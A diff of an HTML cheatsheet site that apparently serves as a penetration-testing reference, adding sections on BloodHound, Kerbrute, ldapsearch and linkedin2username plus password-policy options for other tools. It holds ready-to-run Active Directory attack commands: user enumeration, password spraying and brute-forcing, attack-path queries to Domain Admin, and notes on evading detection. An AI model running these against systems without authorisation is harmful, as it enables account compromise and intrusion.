@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-f5f60548.js";
+            window.path_to_searchindex_js = "searchindex-e60b928f.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-3b61a774.js"></script>
+        <script src="toc-4a6e0194.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -186,6 +186,7 @@
 <h2 id="directory-map"><a class="header" href="#directory-map">Directory Map</a></h2>
 <ul>
 <li><a href="#api-architectural-styles">api_architecture_styles</a></li>
+<li><a href="#bloodhound-cheatsheet">bloodhound</a></li>
 <li><a href="#cap-theorem">cap_theorem</a></li>
 <li><a href="#chisel">chisel</a></li>
 <li><a href="#crackmapexec-cme-cheatsheet">crackmapexec</a></li>
@@ -200,8 +201,11 @@
 <li><a href="#hydra-cheatsheet">hydra</a></li>
 <li><a href="#impacket-cheatsheet">impacket</a></li>
 <li><a href="#john-the-ripper-cheatsheet">john</a></li>
+<li><a href="#kerbrute-cheatsheet">kerbrute</a></li>
 <li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
 <li><a href="#lazagne-cheatsheet">lazagne</a></li>
+<li><a href="#ldapsearch-cheatsheet">ldapsearch</a></li>
+<li><a href="#linkedin2username-cheatsheet">linkedin2username</a></li>
 <li><a href="#make-files">make_files</a></li>
 <li><a href="#medusa-cheatsheet">medusa</a></li>
 <li><a href="#metasploit-cheatsheet">metasploit</a></li>
@@ -209,10 +213,12 @@
 <li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
 <li><a href="#ncat-file-transfer">ncat</a></li>
 <li><a href="#neovim-cheatsheet">neovim</a></li>
+<li><a href="#netexe-cheatsheet">net.exe</a></li>
 <li><a href="#netcat-file-transfer">netcat</a></li>
 <li><a href="#nikto-cheatsheet">nikto</a></li>
 <li><a href="#nmap-cheatsheet">nmap</a></li>
 <li><a href="#powershell-file-transfer">powershell</a></li>
+<li><a href="#powerview-cheatsheet">powerview</a></li>
 <li><a href="#ptunnel-ng">ptunnel-ng</a></li>
 <li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
 <li><a href="#ranger-cheatsheet">ranger</a></li>
@@ -228,6 +234,7 @@
 <li><a href="#t-sql-cheatsheet">tsql</a></li>
 <li><a href="#unshadow-cheatsheet">unshadow</a></li>
 <li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
+<li><a href="#windapsearch-cheatsheet">windapsearch</a></li>
 <li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
 <li><a href="#multi-line-strings">yaml</a></li>
 </ul>
@@ -252,6 +259,136 @@
 <h2 id="soap"><a class="header" href="#soap">SOAP</a></h2>
 <p>SOAP stands for Simple Object Access Protocol. Its payload is XML only, suitable for communications between internal systems.</p>
 <p><img src="cheatsheets/images/api_arch_styles/styles.png" alt=""></p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="bloodhound-cheatsheet"><a class="header" href="#bloodhound-cheatsheet">BloodHound Cheatsheet</a></h1>
+<p>Active Directory relationship visualization and attack path discovery tool.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
+<li>Requires data collection (via SharpHound or bloodhound-python) and a Neo4j database</li>
+</ul>
+<hr>
+<h2 id="components"><a class="header" href="#components">Components</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Component</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>BloodHound</strong></td><td>GUI for visualizing and querying AD relationships</td></tr>
+<tr><td><strong>SharpHound</strong></td><td>C# data collector (runs on Windows domain-joined hosts)</td></tr>
+<tr><td><strong>bloodhound-python</strong></td><td>Python-based remote collector (runs from Linux)</td></tr>
+<tr><td><strong>Neo4j</strong></td><td>Graph database backend</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="installation"><a class="header" href="#installation">Installation</a></h2>
+<h3 id="bloodhound--neo4j-linux"><a class="header" href="#bloodhound--neo4j-linux">BloodHound + Neo4j (Linux)</a></h3>
+<pre><code class="language-bash">sudo apt install bloodhound neo4j
+sudo neo4j console
+</code></pre>
+<p>Default Neo4j credentials: <code>neo4j:neo4j</code> (change on first login at <code>http://localhost:7474</code>)</p>
+<h3 id="bloodhound-python-linux-collector"><a class="header" href="#bloodhound-python-linux-collector">bloodhound-python (Linux Collector)</a></h3>
+<pre><code class="language-bash">pip install bloodhound
+</code></pre>
+<hr>
+<h2 id="data-collection"><a class="header" href="#data-collection">Data Collection</a></h2>
+<h3 id="sharphound-windows"><a class="header" href="#sharphound-windows">SharpHound (Windows)</a></h3>
+<h4 id="all-collection-methods"><a class="header" href="#all-collection-methods">All Collection Methods</a></h4>
+<pre><code class="language-powershell">.\SharpHound.exe -c All
+</code></pre>
+<h4 id="specific-collection-methods"><a class="header" href="#specific-collection-methods">Specific Collection Methods</a></h4>
+<pre><code class="language-powershell">.\SharpHound.exe -c DCOnly
+.\SharpHound.exe -c Session,LoggedOn
+.\SharpHound.exe -c Group,Trusts,ACL
+</code></pre>
+<h4 id="with-credentials"><a class="header" href="#with-credentials">With Credentials</a></h4>
+<pre><code class="language-powershell">.\SharpHound.exe -c All -d domain.local --ldapusername user --ldappassword pass
+</code></pre>
+<h4 id="loop-session-collection"><a class="header" href="#loop-session-collection">Loop Session Collection</a></h4>
+<pre><code class="language-powershell">.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00
+</code></pre>
+<h3 id="sharphound-collection-methods"><a class="header" href="#sharphound-collection-methods">SharpHound Collection Methods</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Method</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Default</code></td><td>Group membership, domain trusts, local admin, sessions</td></tr>
+<tr><td><code>All</code></td><td>All collection methods</td></tr>
+<tr><td><code>DCOnly</code></td><td>Collectable from DC only (no host enumeration)</td></tr>
+<tr><td><code>Session</code></td><td>Session data</td></tr>
+<tr><td><code>LoggedOn</code></td><td>Privileged session collection</td></tr>
+<tr><td><code>Group</code></td><td>Group membership</td></tr>
+<tr><td><code>Trusts</code></td><td>Domain trust data</td></tr>
+<tr><td><code>ACL</code></td><td>ACL data</td></tr>
+<tr><td><code>ObjectProps</code></td><td>Object properties</td></tr>
+<tr><td><code>Container</code></td><td>OU/GPO container structure</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="bloodhound-python-linux"><a class="header" href="#bloodhound-python-linux">bloodhound-python (Linux)</a></h3>
+<h4 id="basic-collection"><a class="header" href="#basic-collection">Basic Collection</a></h4>
+<pre><code class="language-bash">bloodhound-python -u user -p 'Password123' -d domain.local -ns 172.16.5.5 -c All
+</code></pre>
+<h4 id="with-specific-dns-server"><a class="header" href="#with-specific-dns-server">With Specific DNS Server</a></h4>
+<pre><code class="language-bash">bloodhound-python -u user -p 'Password123' -d domain.local -dc dc01.domain.local -ns 172.16.5.5 -c All
+</code></pre>
+<hr>
+<h2 id="using-the-bloodhound-gui"><a class="header" href="#using-the-bloodhound-gui">Using the BloodHound GUI</a></h2>
+<h3 id="start-bloodhound"><a class="header" href="#start-bloodhound">Start BloodHound</a></h3>
+<pre><code class="language-bash">sudo neo4j start
+bloodhound
+</code></pre>
+<h3 id="import-data"><a class="header" href="#import-data">Import Data</a></h3>
+<ol>
+<li>Click the “Upload Data” button (up arrow icon)</li>
+<li>Select the <code>.json</code> or <code>.zip</code> files from SharpHound/bloodhound-python</li>
+</ol>
+<hr>
+<h2 id="built-in-queries"><a class="header" href="#built-in-queries">Built-in Queries</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Query</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Find all Domain Admins</td><td>Maps DA group members</td></tr>
+<tr><td>Find Shortest Paths to Domain Admins</td><td>Attack paths to DA</td></tr>
+<tr><td>Find Principals with DCSync Rights</td><td>Users that can perform DCSync</td></tr>
+<tr><td>Find Computers with Unsupported OS</td><td>Legacy systems</td></tr>
+<tr><td>Find Kerberoastable Accounts</td><td>SPNs set on user accounts</td></tr>
+<tr><td>Find AS-REP Roastable Users</td><td>Pre-auth disabled accounts</td></tr>
+<tr><td>Shortest Paths to High Value Targets</td><td>Quickest escalation paths</td></tr>
+<tr><td>Find Computers Where Domain Users are Local Admin</td><td>Over-permissioned hosts</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="custom-cypher-queries"><a class="header" href="#custom-cypher-queries">Custom Cypher Queries</a></h2>
+<h3 id="find-all-kerberoastable-users"><a class="header" href="#find-all-kerberoastable-users">Find All Kerberoastable Users</a></h3>
+<pre><code class="language-cypher">MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames
+</code></pre>
+<h3 id="find-users-with-admin-count"><a class="header" href="#find-users-with-admin-count">Find Users with Admin Count</a></h3>
+<pre><code class="language-cypher">MATCH (u:User) WHERE u.admincount=true RETURN u.name
+</code></pre>
+<h3 id="shortest-path-from-owned-user-to-domain-admin"><a class="header" href="#shortest-path-from-owned-user-to-domain-admin">Shortest Path from Owned User to Domain Admin</a></h3>
+<pre><code class="language-cypher">MATCH p=shortestPath((u:User {owned:true})-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+</code></pre>
+<h3 id="find-all-sessions"><a class="header" href="#find-all-sessions">Find All Sessions</a></h3>
+<pre><code class="language-cypher">MATCH p=(c:Computer)-[:HasSession]-&gt;(u:User) RETURN p
+</code></pre>
+<hr>
+<h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
+<ul>
+<li>Mark compromised users/computers as “Owned” to find paths from your current position</li>
+<li>Mark high-value targets to focus path discovery</li>
+<li>Use “Shortest Paths from Owned Principals” after marking owned nodes</li>
+<li>Session data is time-sensitive — re-collect periodically with <code>--Loop</code></li>
+<li><code>DCOnly</code> collection is stealthier (no host enumeration)</li>
+<li>Export graphs and paths for inclusion in reports</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cap-theorem"><a class="header" href="#cap-theorem">cap theorem</a></h1>
 <p>CAP theorem states that it is impossible for a distributed system to provide more than two of these guarantees: consistency, availability, and partition tolerance.</p>
@@ -416,6 +553,12 @@ proxychains nmap -sT &lt;TARGET_IP&gt;
 <h3 id="enumerate-sessions"><a class="header" href="#enumerate-sessions">Enumerate Sessions</a></h3>
 <pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --sessions
 </code></pre>
+<hr>
+<h2 id="password-policy-enumeration"><a class="header" href="#password-policy-enumeration">Password Policy Enumeration</a></h2>
+<h3 id="dump-domain-password-policy"><a class="header" href="#dump-domain-password-policy">Dump Domain Password Policy</a></h3>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 --pass-pol
+</code></pre>
+<p>Returns: minimum password length, password history, complexity flags, lockout threshold, lockout duration, and reset counter.</p>
 <hr>
 <h2 id="password-spraying"><a class="header" href="#password-spraying">Password Spraying</a></h2>
 <h3 id="single-password-against-user-list"><a class="header" href="#single-password-against-user-list">Single Password Against User List</a></h3>
@@ -795,7 +938,7 @@ Start-Dnscat2 -DNSserver &lt;ATTACKER_IP&gt; -Domain &lt;DOMAIN&gt; -PreSharedSe
 <h3 id="rid-cycling-user-enumeration"><a class="header" href="#rid-cycling-user-enumeration">RID Cycling (User Enumeration)</a></h3>
 <pre><code class="language-bash">enum4linux -r 10.10.10.10
 </code></pre>
-<h3 id="with-credentials"><a class="header" href="#with-credentials">With Credentials</a></h3>
+<h3 id="with-credentials-1"><a class="header" href="#with-credentials-1">With Credentials</a></h3>
 <pre><code class="language-bash">enum4linux -a -u admin -p Password123 10.10.10.10
 </code></pre>
 <h3 id="detailed-user-enumeration"><a class="header" href="#detailed-user-enumeration">Detailed User Enumeration</a></h3>
@@ -804,17 +947,23 @@ Start-Dnscat2 -DNSserver &lt;ATTACKER_IP&gt; -Domain &lt;DOMAIN&gt; -PreSharedSe
 <hr>
 <h2 id="enum4linux-ng"><a class="header" href="#enum4linux-ng">enum4linux-ng</a></h2>
 <p>Modern rewrite with additional features:</p>
-<h3 id="installation"><a class="header" href="#installation">Installation</a></h3>
+<h3 id="installation-1"><a class="header" href="#installation-1">Installation</a></h3>
 <pre><code class="language-bash">pip install enum4linux-ng
 </code></pre>
 <h3 id="basic-usage"><a class="header" href="#basic-usage">Basic Usage</a></h3>
 <pre><code class="language-bash">enum4linux-ng 10.10.10.10
 </code></pre>
-<h3 id="with-credentials-1"><a class="header" href="#with-credentials-1">With Credentials</a></h3>
+<h3 id="with-credentials-1-1"><a class="header" href="#with-credentials-1-1">With Credentials</a></h3>
 <pre><code class="language-bash">enum4linux-ng -u admin -p Password123 10.10.10.10
+</code></pre>
+<h3 id="get-password-policy-1"><a class="header" href="#get-password-policy-1">Get Password Policy</a></h3>
+<pre><code class="language-bash">enum4linux-ng -P 10.10.10.10
 </code></pre>
 <h3 id="output-to-json"><a class="header" href="#output-to-json">Output to JSON</a></h3>
 <pre><code class="language-bash">enum4linux-ng -oJ output.json 10.10.10.10
+</code></pre>
+<h3 id="output-to-all-formats-json--yaml"><a class="header" href="#output-to-all-formats-json--yaml">Output to All Formats (JSON + YAML)</a></h3>
+<pre><code class="language-bash">enum4linux-ng -P 10.10.10.10 -oA output_prefix
 </code></pre>
 <hr>
 <h2 id="information-gathered"><a class="header" href="#information-gathered">Information Gathered</a></h2>
@@ -1144,7 +1293,7 @@ arpwatch
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="fierce"><a class="header" href="#fierce">fierce</a></h1>
 <p>Fierce is a DNS reconnaissance tool used for locating non-contiguous IP space and hostnames against specified domains. It’s particularly useful for finding targets both inside and outside a corporate network.</p>
-<h2 id="installation-1"><a class="header" href="#installation-1">Installation</a></h2>
+<h2 id="installation-2"><a class="header" href="#installation-2">Installation</a></h2>
 <pre><code class="language-bash"># Kali/Debian
 sudo apt install fierce
 
@@ -2024,6 +2173,107 @@ sudo umount /media/bitlockermount
 sudo umount /media/bitlocker
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="kerbrute-cheatsheet"><a class="header" href="#kerbrute-cheatsheet">Kerbrute Cheatsheet</a></h1>
+<p>Fast Kerberos pre-authentication brute-forcer for username enumeration and password spraying.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></li>
+<li>Does <strong>not</strong> generate event ID 4625 (logon failure) during username enumeration</li>
+<li>Generates event ID 4768 (TGT request) if Kerberos logging is enabled</li>
+<li>Username enumeration does not cause account lockouts</li>
+<li>Password spraying <strong>does</strong> count toward lockout thresholds</li>
+</ul>
+<hr>
+<h2 id="basic-syntax-8"><a class="header" href="#basic-syntax-8">Basic Syntax</a></h2>
+<pre><code class="language-bash">kerbrute &lt;command&gt; [flags]
+</code></pre>
+<hr>
+<h2 id="commands"><a class="header" href="#commands">Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>userenum</code></td><td>Enumerate valid AD usernames via Kerberos</td></tr>
+<tr><td><code>passwordspray</code></td><td>Spray a single password against a list of users</td></tr>
+<tr><td><code>bruteuser</code></td><td>Brute-force a single user’s password</td></tr>
+<tr><td><code>bruteforce</code></td><td>Brute-force using <code>user:password</code> combo list</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="global-flags"><a class="header" href="#global-flags">Global Flags</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-d DOMAIN</code></td><td>Domain to authenticate against (required)</td></tr>
+<tr><td><code>--dc IP</code></td><td>Domain Controller IP or hostname</td></tr>
+<tr><td><code>-t THREADS</code></td><td>Number of threads (default: 10)</td></tr>
+<tr><td><code>-o FILE</code></td><td>Output file for results</td></tr>
+<tr><td><code>--safe</code></td><td>Safe mode — abort if any account is locked out</td></tr>
+<tr><td><code>--downgrade</code></td><td>Downgrade to ARCFOUR-HMAC-MD5 encryption</td></tr>
+<tr><td><code>-v</code></td><td>Verbose output</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="username-enumeration"><a class="header" href="#username-enumeration">Username Enumeration</a></h2>
+<h3 id="enumerate-valid-users-from-wordlist"><a class="header" href="#enumerate-valid-users-from-wordlist">Enumerate Valid Users from Wordlist</a></h3>
+<pre><code class="language-bash">kerbrute userenum -d domain.local --dc 172.16.5.5 /path/to/userlist.txt
+</code></pre>
+<h3 id="with-output-file"><a class="header" href="#with-output-file">With Output File</a></h3>
+<pre><code class="language-bash">kerbrute userenum -d domain.local --dc 172.16.5.5 -o valid_users.txt /path/to/userlist.txt
+</code></pre>
+<p><strong>How it works:</strong> Sends AS-REQ without pre-authentication. If the KDC responds with <code>PRINCIPAL UNKNOWN</code>, the user doesn’t exist. If it prompts for pre-auth, the user is valid.</p>
+<hr>
+<h2 id="password-spraying-1"><a class="header" href="#password-spraying-1">Password Spraying</a></h2>
+<h3 id="spray-single-password"><a class="header" href="#spray-single-password">Spray Single Password</a></h3>
+<pre><code class="language-bash">kerbrute passwordspray -d domain.local --dc 172.16.5.5 valid_users.txt 'Welcome1'
+</code></pre>
+<h3 id="safe-mode-stop-on-lockout"><a class="header" href="#safe-mode-stop-on-lockout">Safe Mode (Stop on Lockout)</a></h3>
+<pre><code class="language-bash">kerbrute passwordspray -d domain.local --dc 172.16.5.5 --safe valid_users.txt 'Welcome1'
+</code></pre>
+<hr>
+<h2 id="brute-force-single-user"><a class="header" href="#brute-force-single-user">Brute-Force Single User</a></h2>
+<pre><code class="language-bash">kerbrute bruteuser -d domain.local --dc 172.16.5.5 /path/to/passwords.txt jsmith
+</code></pre>
+<hr>
+<h2 id="brute-force-with-combo-list"><a class="header" href="#brute-force-with-combo-list">Brute-Force with Combo List</a></h2>
+<p>File format: <code>user:password</code> (one per line)</p>
+<pre><code class="language-bash">kerbrute bruteforce -d domain.local --dc 172.16.5.5 combos.txt
+</code></pre>
+<hr>
+<h2 id="useful-username-wordlists"><a class="header" href="#useful-username-wordlists">Useful Username Wordlists</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>List</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>jsmith.txt</code></td><td>48,705 <code>flast</code> format names</td></tr>
+<tr><td><code>jsmith2.txt</code></td><td>Extended <code>flast</code> list</td></tr>
+<tr><td><code>top-usernames-shortlist.txt</code></td><td>Common usernames</td></tr>
+</tbody>
+</table>
+</div>
+<p>Source: <a href="https://github.com/insidetrust/statistically-likely-usernames">statistically-likely-usernames</a></p>
+<hr>
+<h2 id="detection-notes"><a class="header" href="#detection-notes">Detection Notes</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Action</th><th>Event ID</th><th>Notes</th></tr>
+</thead>
+<tbody>
+<tr><td>Username enumeration</td><td>4768</td><td>Only if Kerberos logging enabled via Group Policy</td></tr>
+<tr><td>Password spraying</td><td>4768 + 4771</td><td>Failed pre-auth counts toward lockout</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="latency-numbers-every-sre-should-know"><a class="header" href="#latency-numbers-every-sre-should-know">Latency Numbers Every SRE Should Know</a></h1>
 <p>nanosecond = 1/1,000,000,000 second
 microsecond = 1/1,000,000 second
@@ -2086,7 +2336,7 @@ millisecond = 1/1000 second</p>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="lazagne-cheatsheet"><a class="header" href="#lazagne-cheatsheet">LaZagne Cheatsheet</a></h1>
-<h2 id="installation-2"><a class="header" href="#installation-2">Installation</a></h2>
+<h2 id="installation-3"><a class="header" href="#installation-3">Installation</a></h2>
 <pre><code class="language-bash"># Windows: Download from releases
 https://github.com/AlessandroZ/LaZagne/releases
 
@@ -2229,6 +2479,229 @@ python3 laZagne.py memory
 </tbody>
 </table>
 </div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ldapsearch-cheatsheet"><a class="header" href="#ldapsearch-cheatsheet">ldapsearch Cheatsheet</a></h1>
+<p>Command-line tool for querying LDAP directories. Part of the OpenLDAP suite.</p>
+<hr>
+<h2 id="basic-syntax-9"><a class="header" href="#basic-syntax-9">Basic Syntax</a></h2>
+<pre><code class="language-bash">ldapsearch [options] [filter] [attributes...]
+</code></pre>
+<hr>
+<h2 id="connection-options"><a class="header" href="#connection-options">Connection Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-h HOST</code></td><td>LDAP server hostname (deprecated, use <code>-H</code>)</td><td><code>-h 172.16.5.5</code></td></tr>
+<tr><td><code>-H URI</code></td><td>LDAP URI</td><td><code>-H ldap://172.16.5.5</code></td></tr>
+<tr><td><code>-p PORT</code></td><td>Port (default: 389, LDAPS: 636)</td><td><code>-p 389</code></td></tr>
+<tr><td><code>-x</code></td><td>Simple authentication (instead of SASL)</td><td></td></tr>
+<tr><td><code>-D BINDDN</code></td><td>Bind DN (username)</td><td><code>-D "CN=admin,DC=domain,DC=local"</code></td></tr>
+<tr><td><code>-w PASS</code></td><td>Bind password</td><td><code>-w Password123</code></td></tr>
+<tr><td><code>-W</code></td><td>Prompt for password</td><td></td></tr>
+<tr><td><code>-Z</code></td><td>Start TLS</td><td></td></tr>
+<tr><td><code>-ZZ</code></td><td>Require TLS (fail if unavailable)</td><td></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="search-options"><a class="header" href="#search-options">Search Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-b BASEDN</code></td><td>Search base DN</td><td><code>-b "DC=DOMAIN,DC=LOCAL"</code></td></tr>
+<tr><td><code>-s SCOPE</code></td><td>Search scope: <code>base</code>, <code>one</code>, <code>sub</code></td><td><code>-s sub</code></td></tr>
+<tr><td><code>-f FILE</code></td><td>Read filters from file</td><td></td></tr>
+<tr><td><code>-l TIMELIMIT</code></td><td>Time limit (seconds)</td><td><code>-l 30</code></td></tr>
+<tr><td><code>-z SIZELIMIT</code></td><td>Size limit (entries)</td><td><code>-z 1000</code></td></tr>
+<tr><td><code>-LLL</code></td><td>Minimal output (no comments, version)</td><td></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="common-ldap-filters"><a class="header" href="#common-ldap-filters">Common LDAP Filters</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Filter</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>(objectclass=user)</code></td><td>All user objects</td></tr>
+<tr><td><code>(objectclass=computer)</code></td><td>All computer objects</td></tr>
+<tr><td><code>(objectclass=group)</code></td><td>All group objects</td></tr>
+<tr><td><code>(&amp;(objectclass=user)(sAMAccountName=jsmith))</code></td><td>Specific user</td></tr>
+<tr><td><code>(&amp;(objectclass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))</code></td><td>Domain Admins</td></tr>
+<tr><td><code>(&amp;(objectclass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))</code></td><td>Enabled accounts only</td></tr>
+<tr><td><code>(sAMAccountType=805306368)</code></td><td>Normal user accounts</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="anonymous-bind-examples"><a class="header" href="#anonymous-bind-examples">Anonymous Bind Examples</a></h2>
+<h3 id="enumerate-all-users"><a class="header" href="#enumerate-all-users">Enumerate All Users</a></h3>
+<pre><code class="language-bash">ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&amp;(objectclass=user))" sAMAccountName | grep sAMAccountName: | cut -f2 -d" "
+</code></pre>
+<h3 id="get-password-policy-2"><a class="header" href="#get-password-policy-2">Get Password Policy</a></h3>
+<pre><code class="language-bash">ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+</code></pre>
+<h3 id="get-domain-info"><a class="header" href="#get-domain-info">Get Domain Info</a></h3>
+<pre><code class="language-bash">ldapsearch -h 172.16.5.5 -x -s base namingcontexts
+</code></pre>
+<hr>
+<h2 id="authenticated-examples"><a class="header" href="#authenticated-examples">Authenticated Examples</a></h2>
+<h3 id="bind-and-search-users"><a class="header" href="#bind-and-search-users">Bind and Search Users</a></h3>
+<pre><code class="language-bash">ldapsearch -H ldap://172.16.5.5 -x -D "CN=admin,DC=domain,DC=local" -w Password123 -b "DC=DOMAIN,DC=LOCAL" "(&amp;(objectclass=user))" sAMAccountName
+</code></pre>
+<h3 id="search-with-minimal-output"><a class="header" href="#search-with-minimal-output">Search with Minimal Output</a></h3>
+<pre><code class="language-bash">ldapsearch -H ldap://172.16.5.5 -x -D "user@domain.local" -w Password123 -b "DC=DOMAIN,DC=LOCAL" -LLL "(objectclass=user)" cn sAMAccountName
+</code></pre>
+<hr>
+<h2 id="useful-attributes-to-query"><a class="header" href="#useful-attributes-to-query">Useful Attributes to Query</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Attribute</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>sAMAccountName</code></td><td>Logon name</td></tr>
+<tr><td><code>userPrincipalName</code></td><td>UPN (user@domain)</td></tr>
+<tr><td><code>cn</code></td><td>Common name</td></tr>
+<tr><td><code>distinguishedName</code></td><td>Full DN path</td></tr>
+<tr><td><code>memberOf</code></td><td>Group memberships</td></tr>
+<tr><td><code>userAccountControl</code></td><td>Account flags (enabled/disabled, etc.)</td></tr>
+<tr><td><code>pwdLastSet</code></td><td>Last password change</td></tr>
+<tr><td><code>lastLogon</code></td><td>Last logon timestamp</td></tr>
+<tr><td><code>lockoutTime</code></td><td>Account lockout time</td></tr>
+<tr><td><code>badPwdCount</code></td><td>Failed password attempts</td></tr>
+<tr><td><code>minPwdLength</code></td><td>Minimum password length (domain-level)</td></tr>
+<tr><td><code>lockoutThreshold</code></td><td>Lockout threshold (domain-level)</td></tr>
+<tr><td><code>pwdHistoryLength</code></td><td>Password history length (domain-level)</td></tr>
+<tr><td><code>pwdProperties</code></td><td>Password complexity flags (domain-level)</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="password-policy-attributes"><a class="header" href="#password-policy-attributes">Password Policy Attributes</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Attribute</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>minPwdLength</code></td><td>Minimum password length</td></tr>
+<tr><td><code>maxPwdAge</code></td><td>Maximum password age</td></tr>
+<tr><td><code>minPwdAge</code></td><td>Minimum password age</td></tr>
+<tr><td><code>pwdHistoryLength</code></td><td>Password history length</td></tr>
+<tr><td><code>pwdProperties</code></td><td>0 = no complexity, 1 = complexity enabled</td></tr>
+<tr><td><code>lockoutThreshold</code></td><td>Bad password attempts before lockout</td></tr>
+<tr><td><code>lockoutDuration</code></td><td>Lockout duration (in 100-nanosecond intervals, negative)</td></tr>
+<tr><td><code>lockOutObservationWindow</code></td><td>Lockout counter reset window</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="tips-1"><a class="header" href="#tips-1">Tips</a></h2>
+<ul>
+<li>Use <code>-LLL</code> for clean, parseable output</li>
+<li>Pipe through <code>grep</code>, <code>awk</code>, or <code>cut</code> to extract specific fields</li>
+<li>Anonymous binds are a legacy config (disabled by default since Windows Server 2003)</li>
+<li>Use <code>-H ldap://</code> instead of the deprecated <code>-h</code> flag in newer versions</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="linkedin2username-cheatsheet"><a class="header" href="#linkedin2username-cheatsheet">linkedin2username Cheatsheet</a></h1>
+<p>OSINT tool that generates username lists from a company’s LinkedIn employee page.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/initstring/linkedin2username">https://github.com/initstring/linkedin2username</a></li>
+</ul>
+<hr>
+<h2 id="installation-4"><a class="header" href="#installation-4">Installation</a></h2>
+<pre><code class="language-bash">git clone https://github.com/initstring/linkedin2username.git
+cd linkedin2username
+pip3 install -r requirements.txt
+</code></pre>
+<hr>
+<h2 id="basic-syntax-10"><a class="header" href="#basic-syntax-10">Basic Syntax</a></h2>
+<pre><code class="language-bash">python3 linkedin2username.py -u &lt;linkedin_email&gt; -c &lt;company_id&gt; [options]
+</code></pre>
+<hr>
+<h2 id="options-1"><a class="header" href="#options-1">Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-u EMAIL</code></td><td>LinkedIn login email (required)</td><td><code>-u user@email.com</code></td></tr>
+<tr><td><code>-c COMPANY_ID</code></td><td>LinkedIn company ID (required)</td><td><code>-c 1234</code></td></tr>
+<tr><td><code>-p PASS</code></td><td>LinkedIn password (prompts if omitted)</td><td><code>-p Password123</code></td></tr>
+<tr><td><code>-n DEPTH</code></td><td>Page depth to scrape (default: 25)</td><td><code>-n 50</code></td></tr>
+<tr><td><code>-d DELAY</code></td><td>Delay between requests in seconds</td><td><code>-d 3</code></td></tr>
+<tr><td><code>-g</code></td><td>Get geolocation data for users</td><td></td></tr>
+<tr><td><code>-o OUTPUT</code></td><td>Output directory</td><td><code>-o ./results</code></td></tr>
